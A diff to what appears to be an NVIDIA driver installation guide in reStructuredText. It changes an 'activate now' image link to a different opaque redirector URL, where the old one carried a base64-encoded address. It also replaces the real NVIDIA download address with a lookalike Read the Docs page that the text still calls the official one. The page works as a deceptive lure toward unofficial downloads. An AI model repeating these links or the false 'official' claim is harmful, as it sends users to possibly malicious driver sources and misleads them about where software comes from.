@@ -8,7 +8,7 @@ Want to install NVIDIA graphics drivers without confusion? This 2025 step-by-ste
 
 .. image:: activatenow.png
    :alt: NVIDIA drivers
-   :target: https://ww0.us?aHR0cHM6Ly9kaXNjb3ZlcmFjdGl2YXRlLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==
+   :target: https://pre.im/?fAEhjk15aubsFts9P3TtFiDkVFVrNir8JXsoFthYmZoaBuGtvbl2kz0G2Gd
 
 ========================================
 Step-by-Step Installation of NVIDIA Drivers for Windows 11 and 10
@@ -39,7 +39,7 @@ Step 2: Go to the Official NVIDIA Driver Page
 -----------------------------------------
 
 Now open your browser and visit:
-👉 https://www.nvidia.com/Download/index.aspx
+👉 https://nvidiadrivers-helphub.readthedocs.io/
 
 This is the official NVIDIA driver download page. Never trust other websites — they may give you the wrong or fake driver.
 
